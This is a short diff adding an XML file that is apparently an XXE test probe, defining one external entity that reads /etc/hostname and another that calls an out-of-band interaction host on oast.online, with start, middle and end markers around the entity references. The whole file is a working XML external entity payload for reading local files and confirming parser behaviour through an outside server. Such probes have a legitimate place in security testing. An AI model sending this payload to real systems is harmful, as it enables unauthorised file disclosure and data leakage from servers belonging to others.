@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY f SYSTEM "file:///etc/hostname"><!ENTITY o SYSTEM "http://db8ljmvohkk49a47bme0q3q6d6nj6nfai.oast.online/tpl-xxe1-resolve">]>
+<root>XXE1-START [&f;] XXE1-MID [&o;] XXE1-END</root>
